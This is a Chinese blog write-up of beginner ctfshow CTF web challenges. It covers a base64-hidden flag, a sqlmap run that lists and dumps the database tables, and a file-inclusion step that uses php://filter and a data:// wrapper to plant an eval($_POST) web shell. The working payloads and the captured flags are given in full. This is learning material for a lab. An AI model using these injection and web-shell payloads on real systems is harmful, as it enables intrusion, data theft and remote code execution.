ctfshow-web练习一

发表于2021-02-18|更新于2021-05-08
|字数总计:444|阅读时长:1分钟|阅读量:

芜湖

在家划水加考驾照已经过去一个月了，驾照拿到了，web手艺要重新拾起来了，头痛啊头痛。。。先做做ctfshow上面的ctf练习题练练手吧。。。

web签到题

源码里面发现了flag的痕迹

<!-- 
Y3Rmc2hvd3tkY2NjZTlhZC02YjRkLTRiNzMtYTExNC04NDVjYjNkMmM0ODR9-->

看起来像是base64编码，解码之后获得flag
ctfshow{dccce9ad-6b4d-4b73-a114-845cb3d2c484}

web2-最简单的SQL注入

既然是最简单的SQL注入，那就拿sqlmap来跑吧，嘤嘤嘤

数据包接下来，然后用sqlmap跑数据库名

  • 第一步
    sqlmap -r 1.txt -dbs

    available databases [6]:
[*] ctftraining
[*] information_schema
[*] mysql
[*] performance_schema
[*] test
[*] web2

  • 第二步
    sqlmap -r 1.txt -D web2 -tables

    Database: web2
[2 tables]
+------+
| flag |
| user |
+------+

  • 第三步
    sqlmap -r 1.txt -D web2 -T flag -columns

    atabase: web2
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(255) |
+--------+--------------+

  • 第四步
    sqlmap -r 1.txt -D web2 -T flag -dump

    Database: web2
Table: flag
[1 entry]
+-----------------------------------------------+
| flag                                          |
+-----------------------------------------------+
| ctfshow{55342700-f2a5-4a8b-b5ad-e4f1805b8d90} |
+-----------------------------------------------+

下面就是flag
ctfshow{55342700-f2a5-4a8b-b5ad-e4f1805b8d90}

web3-更简单的web题

嘤嘤嘤，任意文件读取

/?url=php://filter/read=convert.base64-encode/resource=flag.php

没搞到，可见文件名或许不是flag.php或者其他情况，这种情况下用data伪协议，用马来获取flag
/?url=data://text/plain,<?php%20phpinfo()?>可以用，那我们就直接传马吧

http://84eac934-71b2-43ce-bf71-a5bf3d9b73b7.chall.ctf.show:8080/?url=data://text/plain,%3C?php%20@eval($_POST[m4]);?%3E

用工具连接一下，ctfgogogo得flag
ctfshow{ce0abe95-7b95-479c-964f-cc3693a20cf2}

web4

跟web3类似，试试同样的办法，看起来是禁用了一些危险的单词字符。。。八嘎，都禁了，看wp知道有日志注入或者远程文件包含。还好我的服务器还有两个月才会过期，还能试试能不能用远程文件包含。
